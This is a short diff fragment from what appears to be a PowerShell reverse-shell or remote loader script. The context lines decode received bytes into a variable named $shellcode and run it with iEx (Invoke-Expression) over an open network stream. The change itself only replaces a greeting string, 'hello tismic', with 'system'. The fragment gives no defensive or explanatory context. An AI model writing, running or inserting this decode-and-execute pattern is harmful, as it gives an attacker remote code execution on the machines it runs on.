@@ -25,7 +25,7 @@ for ($i = 0; $i -lt $bytes.Count; $i++) {
 }
 $shellcode = [System.Text.Encoding]::Unicode.GetString($byteArray)
 iEx $shellcode
-$Writer.WriteLine("hello tismic")
+$Writer.WriteLine("system")
 $Writer.Flush()
 # Close the connection
 $StreamReader.Close()
